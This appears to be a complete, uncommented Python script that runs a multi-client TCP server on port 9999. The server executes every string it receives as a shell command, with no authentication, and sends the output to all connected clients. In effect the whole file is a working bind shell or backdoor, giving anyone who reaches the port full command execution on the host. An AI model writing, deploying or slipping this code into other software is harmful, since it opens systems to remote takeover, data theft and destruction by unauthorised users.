import socket
import threading
import subprocess

clients = []

def broadcast(message):
    for client in clients:
        try:
            client.sendall(message)
        except:
            clients.remove(client)

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                client_socket.close()
                clients.remove(client_socket)
                break
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = result.stdout + result.stderr
            broadcast(f"Command: {command}\n{response}".encode())
        except:
            clients.remove(client_socket)
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("Server started on port 9999")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        clients.append(client_socket)
        thread = threading.Thread(target=handle_client, args=(client_socket,))
        thread.start()

if __name__ == "__main__":
    start_server()
